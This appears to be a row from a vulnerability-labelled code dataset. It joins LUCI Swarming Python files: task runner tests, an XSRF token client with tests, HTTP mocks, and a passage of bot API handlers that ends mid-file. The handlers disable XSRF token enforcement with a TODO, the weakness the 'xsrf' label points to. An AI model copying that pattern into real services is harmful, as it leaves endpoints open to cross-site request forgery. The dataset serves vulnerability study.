        grace_period=self.SHORT_TIME_OUT)
    # Returns 0 because the process cleaned up itself.
    expected = {
      u'exit_code': exit_code,
      u'hard_timeout': False,
      u'io_timeout': True,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_isolated_grand_children(self):
    """"""Runs a normal test involving 3 level deep subprocesses.""""""
    # Uses load_and_run()
    files = {
      'parent.py': (
        'import subprocess, sys\n'
        'sys.exit(subprocess.call([sys.executable,\'-u\',\'children.py\']))\n'),
      'children.py': (
        'import subprocess, sys\n'
        'sys.exit(subprocess.call('
            '[sys.executable, \'-u\', \'grand_children.py\']))\n'),
      'grand_children.py': 'print \'hi\'',
    }

    def check_final(kwargs):
      # Warning: this modifies input arguments.
      self.assertLess(0, kwargs['data'].pop('cost_usd'))
      self.assertLess(0, kwargs['data'].pop('bot_overhead'))
      self.assertLess(0, kwargs['data'].pop('duration'))
      self.assertLess(
          0., kwargs['data']['isolated_stats']['download'].pop('duration'))
      # duration==0 can happen on Windows when the clock is in the default
      # resolution, 15.6ms.
      self.assertLessEqual(
          0., kwargs['data']['isolated_stats']['upload'].pop('duration'))
      # Makes the diffing easier.
      kwargs['data']['output'] = base64.b64decode(kwargs['data']['output'])
      for k in ('download', 'upload'):
        for j in ('items_cold', 'items_hot'):
          kwargs['data']['isolated_stats'][k][j] = large.unpack(
              base64.b64decode(kwargs['data']['isolated_stats'][k][j]))
      self.assertEqual(
          {
            'data': {
              'exit_code': 0,
              'hard_timeout': False,
              'id': u'localhost',
              'io_timeout': False,
              'isolated_stats': {
                u'download': {
                  u'initial_number_items': 0,
                  u'initial_size': 0,
                  u'items_cold': [10, 86, 94, 276],
                  u'items_hot': [],
                },
                u'upload': {
                  u'items_cold': [],
                  u'items_hot': [],
                },
              },
              'output': 'hi\n',
              'output_chunk_start': 0,
              'task_id': 23,
            },
          },
          kwargs)
    requests = [
      (
        'https://localhost:1/swarming/api/v1/bot/task_update/23',
        self.get_check_first(0.),
        {},
      ),
      (
        'https://localhost:1/swarming/api/v1/bot/task_update/23',
        check_final,
        {},
      ),
    ]
    self.expected_requests(requests)

    server = isolateserver_mock.MockIsolateServer()
    try:
      isolated = json.dumps({
        'command': ['python', 'parent.py'],
        'files': {
          name: {
            'h': server.add_content_compressed('default-gzip', content),
            's': len(content),
          } for name, content in files.iteritems()
        },
      })
      isolated_digest = server.add_content_compressed('default-gzip', isolated)
      manifest = get_manifest(
          inputs_ref={
            'isolated': isolated_digest,
            'namespace': 'default-gzip',
            'isolatedserver': server.url,
          })
      expected = {
        u'exit_code': 0,
        u'hard_timeout': False,
        u'io_timeout': False,
        u'must_signal_internal_failure': None,
        u'version': task_runner.OUT_VERSION,
      }
      self.assertEqual(expected, self._load_and_run(manifest))
    finally:
      server.close()

  def test_isolated_io_signal_no_grace_grand_children(self):
    """"""Handles grand-children process hanging and signal management.

    In this case, the I/O timeout is implemented by task_runner. An hard timeout
    would be implemented by run_isolated (depending on overhead).
    """"""
    # Uses load_and_run()
    # https://msdn.microsoft.com/library/cc704588.aspx
    # STATUS_CONTROL_C_EXIT=0xC000013A. Python sees it as -1073741510.
    exit_code = -1073741510 if sys.platform == 'win32' else -signal.SIGTERM

    files = {
      'parent.py': (
        'import subprocess, sys\n'
        'print(\'parent\')\n'
        'p = subprocess.Popen([sys.executable, \'-u\', \'children.py\'])\n'
        'print(p.pid)\n'
        'p.wait()\n'
        'sys.exit(p.returncode)\n'),
      'children.py': (
        'import subprocess, sys\n'
        'print(\'children\')\n'
        'p = subprocess.Popen([sys.executable,\'-u\',\'grand_children.py\'])\n'
        'print(p.pid)\n'
        'p.wait()\n'
        'sys.exit(p.returncode)\n'),
      'grand_children.py': self.SCRIPT_SIGNAL_HANG,
    }
    # We need to catch the pid of the grand children to be able to kill it, so
    # create our own check_final() instead of using self._gen_requests().
    to_kill = []
    def check_final(kwargs):
      self.assertLess(self.SHORT_TIME_OUT, kwargs['data'].pop('cost_usd'))
      self.assertLess(self.SHORT_TIME_OUT, kwargs['data'].pop('duration'))
      self.assertLess(0., kwargs['data'].pop('bot_overhead'))
      self.assertLess(
          0., kwargs['data']['isolated_stats']['download'].pop('duration'))
      self.assertLess(
          0., kwargs['data']['isolated_stats']['upload'].pop('duration'))
      # Makes the diffing easier.
      for k in ('download', 'upload'):
        for j in ('items_cold', 'items_hot'):
          kwargs['data']['isolated_stats'][k][j] = large.unpack(
              base64.b64decode(kwargs['data']['isolated_stats'][k][j]))
      # The command print the pid of this child and grand-child processes, each
      # on its line.
      output = base64.b64decode(kwargs['data'].pop('output', ''))
      for line in output.splitlines():
        try:
          to_kill.append(int(line))
        except ValueError:
          pass
      self.assertEqual(
          {
            'data': {
              'exit_code': exit_code,
              'hard_timeout': False,
              'id': u'localhost',
              'io_timeout': True,
              'isolated_stats': {
                u'download': {
                  u'initial_number_items': 0,
                  u'initial_size': 0,
                  u'items_cold': [144, 150, 285, 307],
                  u'items_hot': [],
                },
                u'upload': {
                  u'items_cold': [],
                  u'items_hot': [],
                },
              },
              'output_chunk_start': 0,
              'task_id': 23,
            },
          },
          kwargs)
    requests = [
      (
        'https://localhost:1/swarming/api/v1/bot/task_update/23',
        self.get_check_first(0.),
        {},
      ),
      (
        'https://localhost:1/swarming/api/v1/bot/task_update/23',
        check_final,
        {},
      ),
    ]
    self.expected_requests(requests)

    server = isolateserver_mock.MockIsolateServer()
    try:
      # TODO(maruel): -u is needed if you don't want python buffering to
      # interfere.
      isolated = json.dumps({
        'command': ['python', '-u', 'parent.py'],
        'files': {
          name: {
            'h': server.add_content_compressed('default-gzip', content),
            's': len(content),
          } for name, content in files.iteritems()
        },
      })
      isolated_digest = server.add_content_compressed('default-gzip', isolated)
      try:
        manifest = get_manifest(
            inputs_ref={
              'isolated': isolated_digest,
              'namespace': 'default-gzip',
              'isolatedserver': server.url,
            },
            # TODO(maruel): A bit cheezy, we'd want the I/O timeout to be just
            # enough to have the time for the PID to be printed but not more.
            io_timeout=1,
            grace_period=self.SHORT_TIME_OUT)
        expected = {
          u'exit_code': exit_code,
          u'hard_timeout': False,
          u'io_timeout': True,
          u'must_signal_internal_failure': None,
          u'version': task_runner.OUT_VERSION,
        }
        self.assertEqual(expected, self._load_and_run(manifest))
        self.assertEqual(2, len(to_kill))
      finally:
        for k in to_kill:
          try:
            if sys.platform == 'win32':
              os.kill(k, signal.SIGTERM)
            else:
              os.kill(k, signal.SIGKILL)
          except OSError:
            pass
    finally:
      server.close()


class TaskRunnerSmoke(unittest.TestCase):
  # Runs a real process and a real Swarming fake server.
  def setUp(self):
    super(TaskRunnerSmoke, self).setUp()
    self.root_dir = tempfile.mkdtemp(prefix='task_runner')
    logging.info('Temp: %s', self.root_dir)
    self._server = fake_swarming.Server(self)

  def tearDown(self):
    try:
      self._server.shutdown()
    finally:
      try:
        file_path.rmtree(self.root_dir)
      except OSError:
        print >> sys.stderr, 'Failed to delete %s' % self.root_dir
      finally:
        super(TaskRunnerSmoke, self).tearDown()

  def test_signal(self):
    # Tests when task_runner gets a SIGTERM.

    # https://msdn.microsoft.com/library/cc704588.aspx
    # STATUS_ENTRYPOINT_NOT_FOUND=0xc0000139. Python sees it as -1073741510.
    exit_code = -1073741510 if sys.platform == 'win32' else -signal.SIGTERM

    os.mkdir(os.path.join(self.root_dir, 'work'))
    signal_file = os.path.join(self.root_dir, 'work', 'signal')
    open(signal_file, 'wb').close()
    manifest = get_manifest(
        script='import os,time;os.remove(%r);time.sleep(60)' % signal_file,
        hard_timeout=60., io_timeout=60.)
    task_in_file = os.path.join(self.root_dir, 'task_runner_in.json')
    task_result_file = os.path.join(self.root_dir, 'task_runner_out.json')
    with open(task_in_file, 'wb') as f:
      json.dump(manifest, f)
    bot = os.path.join(self.root_dir, 'swarming_bot.1.zip')
    code, _ = fake_swarming.gen_zip(self._server.url)
    with open(bot, 'wb') as f:
      f.write(code)
    cmd = [
      sys.executable, bot, 'task_runner',
      '--swarming-server', self._server.url,
      '--in-file', task_in_file,
      '--out-file', task_result_file,
      '--cost-usd-hour', '1',
      # Include the time taken to poll the task in the cost.
      '--start', str(time.time()),
    ]
    logging.info('%s', cmd)
    proc = subprocess42.Popen(cmd, cwd=self.root_dir, detached=True)
    # Wait for the child process to be alive.
    while os.path.isfile(signal_file):
      time.sleep(0.01)
    # Send SIGTERM to task_runner itself. Ensure the right thing happen.
    # Note that on Windows, this is actually sending a SIGBREAK since there's no
    # such thing as SIGTERM.
    proc.send_signal(signal.SIGTERM)
    proc.wait()
    task_runner_log = os.path.join(self.root_dir, 'logs', 'task_runner.log')
    with open(task_runner_log, 'rb') as f:
      logging.info('task_runner.log:\n---\n%s---', f.read())
    expected = {
      u'exit_code': 0,
      u'hard_timeout': False,
      u'io_timeout': False,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual([], self._server.get_events())
    tasks = self._server.get_tasks()
    for task in tasks.itervalues():
      for event in task:
        event.pop('cost_usd')
        event.pop('duration', None)
        event.pop('bot_overhead', None)
    expected = {
      '23': [
        {
          u'id': u'localhost',
          u'task_id': 23,
        },
        {
          u'exit_code': exit_code,
          u'hard_timeout': False,
          u'id': u'localhost',
          u'io_timeout': False,
          u'task_id': 23,
        },
      ],
    }
    self.assertEqual(expected, tasks)
    expected = {
      'swarming_bot.1.zip',
      '4e019f31778ba7191f965469dc673280386bbd60-cacert.pem',
      'work',
      'logs',
      # TODO(maruel): Move inside work.
      'task_runner_in.json',
      'task_runner_out.json',
    }
    self.assertEqual(expected, set(os.listdir(self.root_dir)))
    expected = {
      u'exit_code': exit_code,
      u'hard_timeout': False,
      u'io_timeout': False,
      u'must_signal_internal_failure':
          u'task_runner received signal %d' % task_runner.SIG_BREAK_OR_TERM,
      u'version': 3,
    }
    with open(task_result_file, 'rb') as f:
      self.assertEqual(expected, json.load(f))
    self.assertEqual(0, proc.returncode)


if __name__ == '__main__':
  fix_encoding.fix_encoding()
  if '-v' in sys.argv:
    unittest.TestCase.maxDiff = None
  logging_utils.prepare_logging(None)
  logging_utils.set_console_level(
      logging.DEBUG if '-v' in sys.argv else logging.CRITICAL+1)
  # Fix litteral text expectation.
  os.environ['LANG'] = 'en_US.UTF-8'
  os.environ['LANGUAGE'] = 'en_US.UTF-8'
  unittest.main()
/n/n/nappengine/swarming/swarming_bot/bot_code/xsrf_client.py/n/n# Copyright 2013 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Wraps URL requests with an XSRF token using components/auth based service.""""""

import datetime
import logging
import os
import sys

THIS_DIR = os.path.dirname(os.path.abspath(__file__))

sys.path.insert(0, os.path.join(THIS_DIR, 'third_party'))

from utils import net


class Error(Exception):
  pass


def _utcnow():
  """"""So it can be mocked.""""""
  return datetime.datetime.utcnow()


class XsrfRemote(object):
  """"""Transparently adds XSRF token to requests.""""""
  TOKEN_RESOURCE = '/auth/api/v1/accounts/self/xsrf_token'

  def __init__(self, url, token_resource=None):
    self.url = url.rstrip('/')
    self.token = None
    self.token_resource = token_resource or self.TOKEN_RESOURCE
    self.expiration = None
    self.xsrf_request_params = {}

  def url_read(self, resource, **kwargs):
    url = self.url + resource
    if kwargs.get('data') == None:
      # No XSRF token for GET.
      return net.url_read(url, **kwargs)

    if self.need_refresh():
      self.refresh_token()
    resp = self._url_read_post(url, **kwargs)
    if resp is None:
      raise Error('Failed to connect to %s; %s' % (url, self.expiration))
    return resp

  def url_read_json(self, resource, **kwargs):
    url = self.url + resource
    if kwargs.get('data') == None:
      # No XSRF token required for GET.
      return net.url_read_json(url, **kwargs)

    if self.need_refresh():
      self.refresh_token()
    resp = self._url_read_json_post(url, **kwargs)
    if resp is None:
      raise Error('Failed to connect to %s; %s' % (url, self.expiration))
    return resp

  def refresh_token(self):
    """"""Returns a fresh token. Necessary as the token may expire after an hour.
    """"""
    url = self.url + self.token_resource
    resp = net.url_read_json(
        url,
        headers={'X-XSRF-Token-Request': '1'},
        data=self.xsrf_request_params)
    if resp is None:
      raise Error('Failed to connect to %s' % url)
    self.token = resp['xsrf_token']
    if resp.get('expiration_sec'):
      exp = resp['expiration_sec']
      exp -= min(round(exp * 0.1), 600)
      self.expiration = _utcnow() + datetime.timedelta(seconds=exp)
    return self.token

  def need_refresh(self):
    """"""Returns True if the XSRF token needs to be refreshed.""""""
    return (
        not self.token or (self.expiration and self.expiration <= _utcnow()))

  def _url_read_post(self, url, **kwargs):
    headers = (kwargs.pop('headers', None) or {}).copy()
    headers['X-XSRF-Token'] = self.token
    return net.url_read(url, headers=headers, **kwargs)

  def _url_read_json_post(self, url, **kwargs):
    headers = (kwargs.pop('headers', None) or {}).copy()
    headers['X-XSRF-Token'] = self.token
    return net.url_read_json(url, headers=headers, **kwargs)
/n/n/nappengine/swarming/swarming_bot/bot_code/xsrf_client_test.py/n/n#!/usr/bin/env python
# Copyright 2013 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

import datetime
import logging
import os
import sys
import time
import unittest

import test_env_bot_code
test_env_bot_code.setup_test_env()

# Creates a server mock for functions in net.py.
import net_utils

import xsrf_client


class UrlHelperTest(net_utils.TestCase):
  def setUp(self):
    super(UrlHelperTest, self).setUp()
    self.mock(logging, 'error', lambda *_: None)
    self.mock(logging, 'exception', lambda *_: None)
    self.mock(logging, 'info', lambda *_: None)
    self.mock(logging, 'warning', lambda *_: None)
    self.mock(time, 'sleep', lambda _: None)

  def testXsrfRemoteGET(self):
    self.expected_requests([('http://localhost/a', {}, 'foo', None)])

    remote = xsrf_client.XsrfRemote('http://localhost/')
    self.assertEqual('foo', remote.url_read('/a'))

  def testXsrfRemoteSimple(self):
    self.expected_requests(
        [
          (
            'http://localhost/auth/api/v1/accounts/self/xsrf_token',
            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},
            {
              'expiration_sec': 100,
              'xsrf_token': 'token',
            },
          ),
          (
            'http://localhost/a',
            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},
            'foo',
            None,
          ),
        ])

    remote = xsrf_client.XsrfRemote('http://localhost/')
    self.assertEqual('foo', remote.url_read('/a', data={'foo': 'bar'}))

  def testXsrfRemoteRefresh(self):
    self.expected_requests(
        [
          (
            'http://localhost/auth/api/v1/accounts/self/xsrf_token',
            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},
            {
              'expiration_sec': 100,
              'xsrf_token': 'token',
            },
          ),
          (
            'http://localhost/a',
            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},
            'bar',
            None,
          ),
          (
            'http://localhost/auth/api/v1/accounts/self/xsrf_token',
            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},
            {
              'expiration_sec': 100,
              'xsrf_token': 'token2',
            },
          ),
          (
            'http://localhost/a',
            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token2'}},
            'foo',
            None,
          ),
        ])

    now = xsrf_client._utcnow()
    remote = xsrf_client.XsrfRemote('http://localhost/')
    remote.url_read('/a', data={'foo': 'bar'})
    self.mock(
        xsrf_client, '_utcnow', lambda: now + datetime.timedelta(seconds=91))
    remote.url_read('/a', data={'foo': 'bar'})

  def testXsrfRemoteCustom(self):
    # Use the new swarming bot API as an example of custom XSRF request handler.
    self.expected_requests(
        [
          (
            'http://localhost/swarming/api/v1/bot/handshake',
            {
              'data': {'attributes': 'b'},
              'headers': {'X-XSRF-Token-Request': '1'},
            },
            {
              'expiration_sec': 100,
              'ignored': True,
              'xsrf_token': 'token',
            },
          ),
          (
            'http://localhost/a',
            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},
            'foo',
            None,
          ),
        ])

    remote = xsrf_client.XsrfRemote(
        'http://localhost/',
        '/swarming/api/v1/bot/handshake')
    remote.xsrf_request_params = {'attributes': 'b'}
    self.assertEqual('foo', remote.url_read('/a', data={'foo': 'bar'}))


if __name__ == '__main__':
  logging.basicConfig(level=logging.ERROR)
  unittest.main()
/n/n/nclient/tests/net_utils.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

import logging
import os
import sys
import threading

TEST_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(TEST_DIR)
sys.path.insert(0, ROOT_DIR)
sys.path.insert(0, os.path.join(ROOT_DIR, 'third_party'))

from depot_tools import auto_stub
from utils import net


def make_fake_response(content, url, headers=None):
  """"""Returns HttpResponse with predefined content, useful in tests.""""""
  headers = dict(headers or {})
  headers['Content-Length'] = len(content)
  class _Fake(object):
    def __init__(self):
      self.content = content
    def iter_content(self, chunk_size):
      c = self.content
      while c:
        yield c[:chunk_size]
        c = c[chunk_size:]
    def read(self):
      return self.content
  return net.HttpResponse(_Fake(), url, headers)


class TestCase(auto_stub.TestCase):
  """"""Mocks out url_open() calls.""""""
  def setUp(self):
    super(TestCase, self).setUp()
    self.mock(net, 'url_open', self._url_open)
    self.mock(net, 'url_read_json', self._url_read_json)
    self.mock(net, 'sleep_before_retry', lambda *_: None)
    self._lock = threading.Lock()
    self._requests = []

  def tearDown(self):
    try:
      if not self.has_failed():
        self.assertEqual([], self._requests)
    finally:
      super(TestCase, self).tearDown()

  def expected_requests(self, requests):
    """"""Registers the expected requests along their reponses.

    Arguments:
      request: list of tuple(url, kwargs, response, headers) for normal requests
          and tuple(url, kwargs, response) for json requests. kwargs can be a
          callable. In that case, it's called with the actual kwargs. It's
          useful when the kwargs values are not deterministic.
    """"""
    requests = requests[:]
    for request in requests:
      self.assertEqual(tuple, request.__class__)
      # 3 = json request (url_read_json).
      # 4 = normal request (url_open).
      self.assertIn(len(request), (3, 4))

    with self._lock:
      self.assertEqual([], self._requests)
      self._requests = requests

  def _url_open(self, url, **kwargs):
    logging.warn('url_open(%s, %s)', url[:500], str(kwargs)[:500])
    with self._lock:
      if not self._requests:
        return None
      # Ignore 'stream' argument, it's not important for these tests.
      kwargs.pop('stream', None)
      for i, n in enumerate(self._requests):
        if n[0] == url:
          data = self._requests.pop(i)
          if len(data) != 4:
            self.fail('Expected normal request, got json data; %s' % url)
          _, expected_kwargs, result, headers = data
          if callable(expected_kwargs):
            expected_kwargs(kwargs)
          else:
            self.assertEqual(expected_kwargs, kwargs)
          if result is not None:
            return make_fake_response(result, url, headers)
          return None
    self.fail('Unknown request %s' % url)

  def _url_read_json(self, url, **kwargs):
    logging.warn('url_read_json(%s, %s)', url[:500], str(kwargs)[:500])
    with self._lock:
      if not self._requests:
        return None
      # Ignore 'stream' argument, it's not important for these tests.
      kwargs.pop('stream', None)
      for i, n in enumerate(self._requests):
        if n[0] == url:
          data = self._requests.pop(i)
          if len(data) != 3:
            self.fail('Expected json request, got normal data; %s' % url)
          _, expected_kwargs, result = data
          if callable(expected_kwargs):
            expected_kwargs(kwargs)
          else:
            self.assertEqual(expected_kwargs, kwargs)
          if result is not None:
            return result
          return None
    self.fail('Unknown request %s %s' % (url, kwargs))
/n/n/n",0,xsrf
9,83,c23a5bf6278f55b3f8135e0edab9927599a09236,"/appengine/swarming/handlers_bot.py/n/n# Copyright 2015 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Internal bot API handlers.""""""

import base64
import json
import logging
import textwrap

import webob
import webapp2

from google.appengine.api import app_identity
from google.appengine.api import datastore_errors
from google.appengine.datastore import datastore_query
from google.appengine import runtime
from google.appengine.ext import ndb

from components import auth
from components import ereporter2
from components import utils
from server import acl
from server import bot_code
from server import bot_management
from server import stats
from server import task_pack
from server import task_request
from server import task_result
from server import task_scheduler
from server import task_to_run


def has_unexpected_subset_keys(expected_keys, minimum_keys, actual_keys, name):
  """"""Returns an error if unexpected keys are present or expected keys are
  missing.

  Accepts optional keys.

  This is important to catch typos.
  """"""
  actual_keys = frozenset(actual_keys)
  superfluous = actual_keys - expected_keys
  missing = minimum_keys - actual_keys
  if superfluous or missing:
    msg_missing = (' missing: %s' % sorted(missing)) if missing else ''
    msg_superfluous = (
        (' superfluous: %s' % sorted(superfluous)) if superfluous else '')
    return 'Unexpected %s%s%s; did you make a typo?' % (
        name, msg_missing, msg_superfluous)


def has_unexpected_keys(expected_keys, actual_keys, name):
  """"""Return an error if unexpected keys are present or expected keys are
  missing.
  """"""
  return has_unexpected_subset_keys(
      expected_keys, expected_keys, actual_keys, name)


def log_unexpected_subset_keys(
    expected_keys, minimum_keys, actual_keys, request, source, name):
  """"""Logs an error if unexpected keys are present or expected keys are missing.

  Accepts optional keys.

  This is important to catch typos.
  """"""
  message = has_unexpected_subset_keys(
    expected_keys, minimum_keys, actual_keys, name)
  if message:
    ereporter2.log_request(request, source=source, message=message)
  return message


def log_unexpected_keys(expected_keys, actual_keys, request, source, name):
  """"""Logs an error if unexpected keys are present or expected keys are missing.
  """"""
  return log_unexpected_subset_keys(
      expected_keys, expected_keys, actual_keys, request, source, name)


def has_missing_keys(minimum_keys, actual_keys, name):
  """"""Returns an error if expected keys are not present.

  Do not warn about unexpected keys.
  """"""
  actual_keys = frozenset(actual_keys)
  missing = minimum_keys - actual_keys
  if missing:
    msg_missing = (' missing: %s' % sorted(missing)) if missing else ''
    return 'Unexpected %s%s; did you make a typo?' % (name, msg_missing)


class BootstrapHandler(auth.AuthenticatingHandler):
  """"""Returns python code to run to bootstrap a swarming bot.""""""

  @auth.require(acl.is_bot)
  def get(self):
    self.response.headers['Content-Type'] = 'text/x-python'
    self.response.headers['Content-Disposition'] = (
        'attachment; filename=""swarming_bot_bootstrap.py""')
    self.response.out.write(
        bot_code.get_bootstrap(self.request.host_url).content)


class BotCodeHandler(auth.AuthenticatingHandler):
  """"""Returns a zip file with all the files required by a bot.

  Optionally specify the hash version to download. If so, the returned data is
  cacheable.
  """"""

  @auth.require(acl.is_bot)
  def get(self, version=None):
    if version:
      expected = bot_code.get_bot_version(self.request.host_url)
      if version != expected:
        # This can happen when the server is rapidly updated.
        logging.error('Requested Swarming bot %s, have %s', version, expected)
        self.abort(404)
      self.response.headers['Cache-Control'] = 'public, max-age=3600'
    else:
      self.response.headers['Cache-Control'] = 'no-cache, no-store'
    self.response.headers['Content-Type'] = 'application/octet-stream'
    self.response.headers['Content-Disposition'] = (
        'attachment; filename=""swarming_bot.zip""')
    self.response.out.write(
        bot_code.get_swarming_bot_zip(self.request.host_url))


class _BotBaseHandler(auth.ApiHandler):
  """"""
  Request body is a JSON dict:
    {
      ""dimensions"": <dict of properties>,
      ""state"": <dict of properties>,
      ""version"": <sha-1 of swarming_bot.zip uncompressed content>,
    }
  """"""

  EXPECTED_KEYS = {u'dimensions', u'state', u'version'}
  REQUIRED_STATE_KEYS = {u'running_time', u'sleep_streak'}

  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.
  xsrf_token_enforce_on = ()

  def _process(self):
    """"""Returns True if the bot has invalid parameter and should be automatically
    quarantined.

    Does one DB synchronous GET.

    Returns:
      tuple(request, bot_id, version, state, dimensions, quarantined_msg)
    """"""
    request = self.parse_body()
    version = request.get('version', None)

    dimensions = request.get('dimensions', {})
    state = request.get('state', {})
    bot_id = None
    if dimensions.get('id'):
      dimension_id = dimensions['id']
      if (isinstance(dimension_id, list) and len(dimension_id) == 1
          and isinstance(dimension_id[0], unicode)):
        bot_id = dimensions['id'][0]

    # The bot may decide to ""self-quarantine"" itself. Accept both via
    # dimensions or via state. See bot_management._BotCommon.quarantined for
    # more details.
    if (bool(dimensions.get('quarantined')) or
        bool(state.get('quarantined'))):
      return request, bot_id, version, state, dimensions, 'Bot self-quarantined'

    quarantined_msg = None
    # Use a dummy 'for' to be able to break early from the block.
    for _ in [0]:

      quarantined_msg = has_unexpected_keys(
          self.EXPECTED_KEYS, request, 'keys')
      if quarantined_msg:
        break

      quarantined_msg = has_missing_keys(
          self.REQUIRED_STATE_KEYS, state, 'state')
      if quarantined_msg:
        break

      if not bot_id:
        quarantined_msg = 'Missing bot id'
        break

      if not all(
          isinstance(key, unicode) and
          isinstance(values, list) and
          all(isinstance(value, unicode) for value in values)
          for key, values in dimensions.iteritems()):
        quarantined_msg = (
            'Invalid dimensions type:\n%s' % json.dumps(dimensions,
              sort_keys=True, indent=2, separators=(',', ': ')))
        break

      dimensions_count = task_to_run.dimensions_powerset_count(dimensions)
      if dimensions_count > task_to_run.MAX_DIMENSIONS:
        quarantined_msg = 'Dimensions product %d is too high' % dimensions_count
        break

      if not isinstance(
          state.get('lease_expiration_ts'), (None.__class__, int)):
        quarantined_msg = (
            'lease_expiration_ts (%r) must be int or None' % (
                state['lease_expiration_ts']))
        break

    if quarantined_msg:
      line = 'Quarantined Bot\nhttps://%s/restricted/bot/%s\n%s' % (
          app_identity.get_default_version_hostname(), bot_id,
          quarantined_msg)
      ereporter2.log_request(self.request, source='bot', message=line)
      return request, bot_id, version, state, dimensions, quarantined_msg

    # Look for admin enforced quarantine.
    bot_settings = bot_management.get_settings_key(bot_id).get()
    if bool(bot_settings and bot_settings.quarantined):
      return request, bot_id, version, state, dimensions, 'Quarantined by admin'

    return request, bot_id, version, state, dimensions, None


class BotHandshakeHandler(_BotBaseHandler):
  """"""First request to be called to get initial data like XSRF token.

  The bot is server-controled so the server doesn't have to support multiple API
  version. When running a task, the bot sync the the version specific URL. Once
  abot finished its currently running task, it'll be immediately be upgraded
  after on its next poll.

  This endpoint does not return commands to the bot, for example to upgrade
  itself. It'll be told so when it does its first poll.

  Response body is a JSON dict:
    {
      ""bot_version"": <sha-1 of swarming_bot.zip uncompressed content>,
      ""server_version"": ""138-193f1f3"",
      ""xsrf_token"": ""......"",
    }
  """"""

  # This handler is called to get XSRF token, there's nothing to enforce yet.
  xsrf_token_enforce_on = ()

  @auth.require_xsrf_token_request
  @auth.require(acl.is_bot)
  def post(self):
    (_request, bot_id, version, state,
        dimensions, quarantined_msg) = self._process()
    bot_management.bot_event(
        event_type='bot_connected', bot_id=bot_id,
        external_ip=self.request.remote_addr, dimensions=dimensions,
        state=state, version=version, quarantined=bool(quarantined_msg),
        task_id='', task_name=None, message=quarantined_msg)

    data = {
      # This access token will be used to validate each subsequent request.
      'bot_version': bot_code.get_bot_version(self.request.host_url),
      'expiration_sec': auth.handler.XSRFToken.expiration_sec,
      'server_version': utils.get_app_version(),
      'xsrf_token': self.generate_xsrf_token(),
    }
    self.send_response(data)


class BotPollHandler(_BotBaseHandler):
  """"""The bot polls for a task; returns either a task, update command or sleep.

  In case of exception on the bot, this is enough to get it just far enough to
  eventually self-update to a working version. This is to ensure that coding
  errors in bot code doesn't kill all the fleet at once, they should still be up
  just enough to be able to self-update again even if they don't get task
  assigned anymore.
  """"""

  @auth.require(acl.is_bot)
  def post(self):
    """"""Handles a polling request.

    Be very permissive on missing values. This can happen because of errors
    on the bot, *we don't want to deny them the capacity to update*, so that the
    bot code is eventually fixed and the bot self-update to this working code.

    It makes recovery of the fleet in case of catastrophic failure much easier.
    """"""
    (_request, bot_id, version, state,
        dimensions, quarantined_msg) = self._process()
    sleep_streak = state.get('sleep_streak', 0)
    quarantined = bool(quarantined_msg)

    # Note bot existence at two places, one for stats at 1 minute resolution,
    # the other for the list of known bots.
    action = 'bot_inactive' if quarantined else 'bot_active'
    stats.add_entry(action=action, bot_id=bot_id, dimensions=dimensions)

    def bot_event(event_type, task_id=None, task_name=None):
      bot_management.bot_event(
          event_type=event_type, bot_id=bot_id,
          external_ip=self.request.remote_addr, dimensions=dimensions,
          state=state, version=version, quarantined=quarantined,
          task_id=task_id, task_name=task_name, message=quarantined_msg)

    # Bot version is host-specific because the host URL is embedded in
    # swarming_bot.zip
    expected_version = bot_code.get_bot_version(self.request.host_url)
    if version != expected_version:
      bot_event('request_update')
      self._cmd_update(expected_version)
      return
    if quarantined:
      bot_event('request_sleep')
      self._cmd_sleep(sleep_streak, quarantined)
      return

    #
    # At that point, the bot should be in relatively good shape since it's
    # running the right version. It is still possible that invalid code was
    # pushed to the server, so be diligent about it.
    #

    # Bot may need a reboot if it is running for too long. We do not reboot
    # quarantined bots.
    needs_restart, restart_message = bot_management.should_restart_bot(
        bot_id, state)
    if needs_restart:
      bot_event('request_restart')
      self._cmd_restart(restart_message)
      return

    # The bot is in good shape. Try to grab a task.
    try:
      # This is a fairly complex function call, exceptions are expected.
      request, run_result = task_scheduler.bot_reap_task(
          dimensions, bot_id, version, state.get('lease_expiration_ts'))
      if not request:
        # No task found, tell it to sleep a bit.
        bot_event('request_sleep')
        self._cmd_sleep(sleep_streak, quarantined)
        return

      try:
        # This part is tricky since it intentionally runs a transaction after
        # another one.
        if request.properties.is_terminate:
          bot_event('bot_terminate', task_id=run_result.task_id)
          self._cmd_terminate(run_result.task_id)
        else:
          bot_event(
              'request_task', task_id=run_result.task_id,
              task_name=request.name)
          self._cmd_run(request, run_result.key, bot_id)
      except:
        logging.exception('Dang, exception after reaping')
        raise
    except runtime.DeadlineExceededError:
      # If the timeout happened before a task was assigned there is no problems.
      # If the timeout occurred after a task was assigned, that task will
      # timeout (BOT_DIED) since the bot didn't get the details required to
      # run it) and it will automatically get retried (TODO) when the task times
      # out.
      # TODO(maruel): Note the task if possible and hand it out on next poll.
      # https://code.google.com/p/swarming/issues/detail?id=130
      self.abort(500, 'Deadline')

  def _cmd_run(self, request, run_result_key, bot_id):
    cmd = None
    if request.properties.commands:
      cmd = request.properties.commands[0]
    elif request.properties.command:
      cmd = request.properties.command
    out = {
      'cmd': 'run',
      'manifest': {
        'bot_id': bot_id,
        'command': cmd,
        'dimensions': request.properties.dimensions,
        'env': request.properties.env,
        'extra_args': request.properties.extra_args,
